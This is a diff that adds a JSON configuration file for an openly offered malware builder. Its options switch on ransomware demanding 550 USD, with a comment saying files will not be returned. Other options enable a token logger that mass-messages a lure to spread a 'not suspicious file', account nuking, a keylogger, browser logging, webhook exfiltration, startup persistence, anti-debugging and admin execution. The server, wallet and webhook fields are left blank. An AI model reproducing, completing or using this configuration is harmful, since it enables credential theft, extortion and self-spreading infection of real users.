@@ -1,0 +1,33 @@
+{
+    "CONNECT_TO_SERVER": [true, 
+        {
+            "SERVER_ADDRESS": "",
+            "SERVER_KEY": "",
+            "DYNAMIC_WEBHOOK": true
+        }
+    ],
+    "RANSOMWARE": [true,
+        {
+            "REBOOTS_ALLOWED": 5,
+            "WALLET": "",
+            "RANSOM_AMOUNT": 550,
+            "//coment": "Price to retrieve their files in USD (It won't actually return their files)"
+        }
+    ],
+    "TOKEN_LOGGER": [true, 
+        {
+            "MASSDM": true,
+            "MASSDM_SCRIPT": "Hey run my super not suspcious file!",
+            "AUTO_NUKE": true
+        }
+    ],
+
+    "KEYLOGGER": true,
+    "LOG_BROWSER": true,
+    "WEBHOOK": "", 
+    "//comment": "// Irrelevant if you enable DYNAMIC_WEBHOOK",
+    "ADD_TO_STARTUP": true,
+    "ANTI_DEBUG": true,
+    "FILE_ICON": "",
+    "RUN_WITH_ADMIN": true
+}
